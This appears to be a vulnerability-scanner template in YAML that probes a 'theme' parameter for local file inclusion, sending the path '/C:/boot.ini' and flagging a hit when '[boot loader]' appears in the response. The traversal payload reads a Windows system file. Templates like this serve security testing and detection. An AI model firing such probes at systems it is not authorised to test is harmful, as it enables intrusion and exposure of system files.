id: lfi6-1109
name: 'Traversal in theme'
severity: high
type: active
tags:
  - lfi
  - traversal
  - file
description: 'Reads sensitive file via theme'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      theme:
        - '/C:/boot.ini'
    matchers:
      - type: word
        part: body
        words:
          - '[boot loader]'
